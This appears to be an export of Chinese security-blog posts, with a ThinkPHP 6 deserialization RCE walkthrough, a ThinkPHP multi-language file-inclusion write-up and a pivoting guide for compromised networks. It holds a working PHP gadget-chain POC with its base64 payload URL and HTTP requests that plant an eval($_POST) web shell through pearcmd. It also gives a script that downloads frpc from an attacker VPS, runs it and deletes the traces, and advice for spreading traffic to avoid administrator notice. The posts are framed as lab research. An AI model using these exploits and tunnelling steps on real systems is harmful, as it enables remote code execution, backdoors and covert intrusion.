<p>总结一下,我们要使得<code>$this-&gt;data</code>为空,<code>$this-&gt;withEvent=false</code>即可使得<code>if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite'))</code>变成<code>if (false || false === true)</code>,再使得<code>$this-&gt;exists</code>为true从而顺利进入Model::updateData。</p>
<p>在Model::updateData中的我们的目标是要进入Model::checkAllowFields</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948099.png" alt="image-20240119104645988"></p>
<p>第一个if判断<code>if (false === $this-&gt;trigger('BeforeUpdate')) </code>和上面一样是我们可以控制绕过的</p>
<p>Model::checkData是一个未定义的方法,无需关注</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948100.png" alt="image-20240119105113540"></p>
<p>进入Model::getChangedData方法,发现可以通过控制<code>$this-&gt;force</code>使得返回结果可控,使得返回结果为空绕过</p>
<p><code>if (empty($data))</code>的判断</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948101.png" alt="image-20240119105232676"></p>
<p>接下来进入判断语句<code>if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime]))</code>,显然这条判断我们可以控制</p>
<p>最终顺利调用Model::checkAllowFields,跳转到checkAllowFields我们的目标是进入Model::db</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948102.png" alt="image-20240119105633073"></p>
<p>无需我们多加什么就可以顺利进入Model::db,在db中我们可以通过点号触发__toString。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948103.png" alt="image-20240119105913867"></p>
<p>我们选择\tp6.0\vendor\topthink\think-orm\src\model\concern\Conversion.php的<code>Conversion::__toString</code>作为上面<code>Model::db</code>触发的目标(因为Model复用了<code>Conversion::__toString</code>,Pivot类继承自抽象类Model,所以使得<code>$this-&gt;name=new Pivot()</code>即可触发<code>Conversion::__toString</code>)</p>
<p>我们查看Conversion::__toString</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948104.png" alt="image-20240119110809881"></p>
<p>进入Conversion::__toJson</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948105.png" alt="image-20240119110849415"></p>
<p>类似thinkphp5发反序列化链,我们继续进入Conversion::toArray,在toArray中我们的目标是进入第三个foreach的Conversion::getAttr</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948106.png" alt="image-20240119110957347"></p>
<p>这里也是无需过多设置,直接可以顺利进入Conversion::getAttr,在getAttr中要经历两个方法Conversion::getData和Conversion::getValue</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948107.png" alt="image-20240119111307090"></p>
<p>Conversion::getData的功能是返回<code>$this-&gt;data[$name]</code>的值,这里就不过多分析了。</p>
<p>重点分析Conversion::getValue,对于这个方法我们这里实际上调用的是<code>$this-&gt;getValue($name,$this-&gt;data[$name], false);</code></p>
<p>进入Conversion::getValue,观察这个方法我们发现第498行的<code>$value   = $closure($value, $this-&gt;data);</code>只要控制<code>$closure</code>为eval,<code>$value</code>为我们想要执行的指令,使<code>$this-&gt;data</code>为空即可成功rce。</p>
<p>这里的两个参数<code>$value</code>和<code>$this-&gt;data</code>我们都是可以控制的,同时因为<code>$name</code>我们可以控制,所以通过485行的Attribute::getRealFieldName我们可以控制<code>$fieldName</code>为<code>$name</code>从而使得<code>$closure</code>可控。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948108.png" alt="image-20240119113919012"></p>
<p>这样最终的poc如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">trait</span> <span class="title class_">Attribute</span></span><br><span class="line">	 &#123;</span><br><span class="line">		 <span class="title class_">private</span> $<span class="title class_">data</span> = [&quot;<span class="title class_">key</span>&quot;=&gt;&quot;<span class="title class_">calc</span>&quot;];</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">	 &#123;</span><br><span class="line">		 <span class="title class_">use</span> <span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">		 <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">		 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">			 <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">		 &#125;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span></span><br><span class="line"> &#123;</span><br><span class="line">	 <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	 <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">	 </span>&#123;</span><br><span class="line"></span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">	 <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line">	 <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成后访问类似url触发rce弹出计算器:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/tp6.0/public/index.php/index/hello/name/TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6NDoiY2FsYyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6NDoiY2FsYyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span><br></pre></td></tr></table></figure>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948109.png" alt="image-20240119115956895"></p>
<h2 id="漏洞总结">漏洞总结:</h2>
<p>该反序列化漏洞的利用链汇总</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Model::__destruct</span><br><span class="line">--&gt;Model::save</span><br><span class="line">--&gt;Model::updateData</span><br><span class="line">--&gt;Model::checkAllowFields</span><br><span class="line">--&gt;Model::db(将类当作字符串拼接从而触发__toString)</span><br><span class="line">--&gt;Conversion::toJson</span><br><span class="line">--&gt;Conversion::toArray</span><br><span class="line">--&gt;Conversion::toArray</span><br><span class="line">--&gt;Conversion::getAttr</span><br><span class="line">--&gt;Attribute::getValue</span><br></pre></td></tr></table></figure>
<p>注意:Pivot继承自抽象类Model,Model复用了Conversion和Attribute的方法</p>
]]></content>
      <categories>
        <category>thinkphp框架漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp多语言本地文件包含漏洞</title>
    <url>/LtmThink/2024/01/29/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞介绍">漏洞介绍:</h2>
<p><code>ThinkPHP</code> 在开启多语言的情况下，存在文件包含漏洞，配合 <code>pearcmd</code> 可以 <code>getshell</code>。</p>
<h2 id="漏洞影响">漏洞影响:</h2>
<p>存在漏洞的版本</p>
<p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
<p>不存在漏洞的版本</p>
<p>ThinkPHP &gt;= 6.0.14<br>
ThinkPHP &gt;= 5.1.42</p>
<h2 id="漏洞分析1-thinkphp5版本">漏洞分析1:thinkphp5版本</h2>
<h4 id="测试环境搭建">测试环境搭建:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp v5.1.41</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
<p>首先在文件tp5.1/config/app.php中开启多语言</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216766.png" alt="image-20240129205913722"></p>
<p>然后在tp5.1/public目录新建文件phpinfo.php内容为&lt;?=phpinfo();</p>
<h4 id="漏洞分析">漏洞分析:</h4>
<p>漏洞验证时当我们访问如下url时会文件包含phpinfo.php</p>
<p>url:<a href="http://localhost/tp5.1/public/index.php/?lang=../../public/phpinfo">http://localhost/tp5.1/public/index.php/?lang=../../public/phpinfo</a></p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216768.png" alt="image-20240129210258464"></p>
<p>我们来分析漏洞成因</p>
<p>首先我们看到tp5.1\thinkphp\library\think\App.php中的loadLangPack方法</p>
<p>文件包含点出现在Lang::load方法中,想要包含任意php文件,我们需要控制变量langset的值</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216769.png" alt="image-20240129211951600"></p>
<p>先分析Lang::detect中</p>
<p>我们可以通过get请求带有参数lang的方式给$this-&gt;range赋任意值</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216770.png" alt="image-20240129212459276"></p>
<p>接着回到loadLangPack方法,因为<code>$this-&gt;request-&gt;setLangset($this-&gt;lang-&gt;range());</code>所以通过Lang类的变量range我们可以给Lang类的变量Langset赋予任意值。</p>
<p>再来看Lang::load</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216771.png" alt="image-20240129213137201"></p>
<p>包含的文件一般是这个样子的,而且我们只能包含php文件。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216772.png" alt="image-20240129213225196"></p>
<p>所以这个漏洞需要和pearcmd拓展相结合才能rce</p>
<p>pearcmd利用方式介绍:<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
<p>所以最终的利用数据包应该是这样的形式(将会在public目录生成后门文件pass.php)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /tp5.1/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;pass&#x27;])?&gt;+pass.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析2-thinkphp6版本">漏洞分析2:thinkphp6版本</h2>
<h4 id="测试环境搭建-2">测试环境搭建:</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp v6.0.13</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
<p>首先在文件tp6.0/app/middleware.php中开启多语言</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216773.png" alt="image-20240129214050772"></p>
<p>然后在tp6.0/public目录新建文件phpinfo.php内容为&lt;?=phpinfo();</p>
<h4 id="漏洞分析-2">漏洞分析:</h4>
<p>漏洞验证时当我们访问如下url时会文件包含phpinfo.php</p>
<p>url:<a href="http://localhost/tp6.0/public/index.php/?lang=../../public/phpinfo">http://localhost/tp6.0/public/index.php/?lang=../../public/phpinfo</a></p>
<p>首先看到tp6.0\vendor\topthink\framework\src\think\middleware\LoadLangPack.php中的handle方法</p>
<p>detect方法和和thinkphp5的没有太大差别同样是可以通过get传递lang的方式设置$langset的值,load</p>
<p>方法在switchLangSet()我们需要进入其中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216774.png" alt="image-20240129220407703"></p>
<p>进入Lang::switchLangSet</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216775.png" alt="image-20240129220805164"></p>
<p>继续进入其中的load方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216776.png" alt="image-20240129220853353"></p>
<p>继续进入其中的parse方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216777.png" alt="image-20240129220939851"></p>
<p>包含的文件一般是这个样子的,还是只能包含php文件。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401292216778.png" alt="image-20240129221419977"></p>
<p>和pearcmd结合利用的数据包如下:(将会在public目录生成后门文件pass.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /tp6.0/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;pass&#x27;])?&gt;+pass.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>thinkphp框架漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透工具使用汇总</title>
    <url>/LtmThink/2024/02/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h3 id="方式1-Neo-reGeorg"><mark>方式1</mark>:Neo-reGeorg</h3>
<p>测试在虚拟中进行:</p>
<ol>
<li class="lvl-3">
<p>攻击者电脑：windows11 192.168.2.1</p>
</li>
<li class="lvl-3">
<p>被入侵的服务器：kail192.168.2.139 和 192.168.22.132</p>
</li>
<li class="lvl-3">
<p>内网其他应用:winows7服务器 192.168.22.133</p>
</li>
</ol>
<p><mark>最低前提条件</mark>:获得被入侵服务器的文件上传权限</p>
<p>步骤:</p>
<ol>
<li class="lvl-3">
<p>下载Neo-reGeorg,并根据服务器的不同上传相应后缀的tunnel文件到服务器网站根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Neo-reGeorg是reGeory的优化重构版</span><br><span class="line">#下载链接</span><br><span class="line">https://github.com/L-codes/Neo-reGeorg</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>在攻击者电脑上运行reGeory的python文件与服务器上上传的tunnel文件建立连接。访问本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#指令如下</span><br><span class="line">#生成相应的tunnel文件</span><br><span class="line">python neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">#连接tunnel文件</span><br><span class="line">python neoreg.py -k password -u http://192.168.2.139/tunnel.php</span><br></pre></td></tr></table></figure>
<p>生成shell</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114530.png" alt="image-20240113214616603"></p>
<p>建立连接</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114531.png" alt="image-20240113214728117"></p>
<p>然后我们只需要以socks5协议设置代理为127.0.0.1:1080,即可通过192.168.2.139访问到内网主机192.168.22.133</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114532.png" alt="image-20240113215048186"></p>
</li>
</ol>
<p>设置代理的方式:Proxifier、proxychains、浏览器或者软件自带的代理</p>
<h3 id="方式2-frp"><mark>方式2</mark>:frp</h3>
<p>测试在虚拟中进行:</p>
<ol>
<li class="lvl-3">
<p>攻击者电脑：windows11</p>
</li>
<li class="lvl-3">
<p>攻击者VPS：ubuntu 12.34.56.789</p>
</li>
<li class="lvl-3">
<p>被入侵的服务器：kail 192.168.2.139 和 192.168.22.132</p>
</li>
<li class="lvl-3">
<p>内网其他应用:winows7服务器 192.168.22.133(仅主机)</p>
</li>
</ol>
<p><mark>最低前提条件</mark>:任意用户的shell</p>
<p>frp服务端架设(基本配置):配置frps.toml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#frp发布版下载链接如下</span><br><span class="line">https://github.com/fatedier/frp/releases/tag/v0.53.2</span><br><span class="line"></span><br><span class="line">#根据vps的不同选择下载相应版本的frp并上传到服务器</span><br><span class="line">#解压后编辑frps.toml对服务端进行配置</span><br><span class="line">#内容如下:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr = 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user = LtmThink</span><br><span class="line">dashboard_pwd = 123456789</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports = 1080</span><br></pre></td></tr></table></figure>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114533.png" alt="image-20240114140325177"></p>
<p>运行frp服务端:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x frps</span><br><span class="line">./frps -c ./frps.toml</span><br><span class="line"></span><br><span class="line">#后台运行frps的指令</span><br><span class="line">nohup ./frps -c ./frps.toml &amp;</span><br></pre></td></tr></table></figure>
<p>然后访问7500端口输入先前配置中的账号密码就可以看到frp服务端成功架设</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114534.png" alt="image-20240114140806810"></p>
<h4 id="1-socks协议代理">1.socks协议代理</h4>
<p>首先最简单常用的就是socks协议代理，这一功能在 frp 中是以插件的形式实现的</p>
<p>步骤:</p>
<ol>
<li class="lvl-3">
<p>客户端配置:准备frpc和frpc.toml,并在frpc.toml中添加如下配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 12.34.56.789</span><br><span class="line">server_port = 7000</span><br><span class="line">tls_enable = true</span><br><span class="line">pool_count = 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = bnbm</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>将这两个文件合并存放到网站根目录的frpc文件夹下</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114535.png" alt="image-20240114143950913"></p>
</li>
<li class="lvl-3">
<p>编写一个自动部署frpc的简单脚本ZLS并将其放到网站根目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://12.34.56.789/frpc/frpc</span><br><span class="line">wget http://12.34.56.789/frpc/frpc.toml</span><br><span class="line">chmod +x frpc</span><br><span class="line"># 启动</span><br><span class="line">nohup ./frpc -c frpc.toml &amp;</span><br><span class="line"># 删除痕迹</span><br><span class="line">rm -rf /tmp/frpc</span><br><span class="line">rm -rf /tmp/frpc.toml</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>将ZLS上传到服务器(任意方式),并运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://12.34.56.789/ZLS &gt;/dev/null 2&gt;&amp;1 &amp;&amp; chmod +x ZLS &amp;&amp; ./ZLS  &amp;&amp; rm -rf ZLS</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>然后根据frpc的配置,我们将vps的相应端口指定为代理即可访问到被入侵服务器的内网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里是2080端口</span><br></pre></td></tr></table></figure>
<p>成功上线</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114536.png" alt="image-20240114150955371"></p>
</li>
</ol>
<p>​				按照配置设置代理<img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114537.png" alt="image-20240114154855544"></p>
<p>成功访问内网web服务器并执行指令</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202402272114538.png" alt="image-20240114154926559"></p>
<p><mark>注意:</mark></p>
<p><mark>部署步骤归结起来就是将两个frpc文件上传然后想办法使其运行即可</mark></p>
<h4 id="2-多级代理使用方法">2.多级代理使用方法</h4>
<p>环境准备:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">个人服务器(Ubuntu):12.34.56.789</span><br><span class="line">出网目标机(本地虚拟机kail,只能访问不能被访问,真实环境下可以被访问):192.168.2.1</span><br><span class="line">内网目标机1(centos7):192.168.2.150和192.168.22.132</span><br><span class="line">内网目标机2(windows7,80端口搭载web服务):192.168.22.133</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>个人服务器上配置frps.toml并运行frps</p>
<p>配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line"># IP 与 bind_addr 默认相同，可以不设置</span><br><span class="line"># dashboard_addr = 0.0.0.0</span><br><span class="line"># 端口必须设置，只有设置web页面才生效</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"># 用户密码保平安</span><br><span class="line">dashboard_user = LtmThink</span><br><span class="line">dashboard_pwd = 123456789</span><br><span class="line"></span><br><span class="line"># 允许客户端绑定的端口</span><br><span class="line">allow_ports = 1080</span><br></pre></td></tr></table></figure>
<p>执行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps -c frps.toml</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>出网目标机上配置frps.toml并运行frps</p>
<p>配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
<p>执行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps -c frps.toml</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>出网目标机上配置frpc.toml并运行frpc</p>
<p>配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 12.34.56.789    </span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">#绑定的远程端口,也就是sock5代理应该连接的端口</span><br><span class="line">remote_port = 1080</span><br><span class="line">#plugin = socks5，不能加上这个</span><br><span class="line">#相较于一级代理，增加如下两个配置</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 7777</span><br></pre></td></tr></table></figure>
<p>运行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>内网目标机1上配置frpc.toml并运行frpc</p>
<p>配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.1</span><br><span class="line">server_port = 7000</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777	  </span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
<p>运行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>将代理设置为个人服务器的1080端口即可访问内网</p>
</li>
</ol>
<h4 id="3-负载均衡">3.负载均衡</h4>
<p>使用场景:</p>
<p>当我们获得好几台可以连接外网的主机时,就可以启用多台客户端，进行负载均衡。让其均衡分担我们访问内网的流量,</p>
<p>毕竟突然从一台机器迸发出大量流量很容易引起管理员的注意，也可以负载分担一下机器的CPU资源消耗</p>
<p>frpc配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 103.242.135.137</span><br><span class="line">server_port = 7000</span><br><span class="line">tls_enable = true</span><br><span class="line">pool_count = 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"># [plugin_socks_2]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 46075</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = test</span><br><span class="line">plugin_passwd = bnbm</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br><span class="line">group = socks_balancing</span><br><span class="line">group_key = NGbB5#8n</span><br></pre></td></tr></table></figure>
<p>多台不同的被攻击机都这么配置就可以了关注多出来的group和group_key</p>
<h4 id="4-udp协议代理">4.udp协议代理</h4>
<p>frp也支持udp协议的代理</p>
<p>以联机星露谷为例(服务端配置不变)</p>
<p>客户端配置文件修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr = 12.34.56.789</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[starudp]                   </span><br><span class="line">type = udp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 24642</span><br><span class="line">remote_port = 1080</span><br></pre></td></tr></table></figure>
<p>这样访问服务器的1080端口就可以访问到本地的24642端口了(星露谷联机端口)</p>
<h3 id="方式3-Venom"><mark>方式3</mark>:Venom</h3>
<p>Venom v1.1.0内网穿透能力强于Neo-reGeorg,使用简单于frp,功能更加丰富,但稳定性差于frp</p>
<p>注意:Venom即支持connect连接(<mark>节点主动连接</mark>)也支持listen连接(<mark>节点被连接</mark>)</p>
<h4 id="1-单级代理使用方法">1.单级代理使用方法</h4>
<p>环境准备:</p>
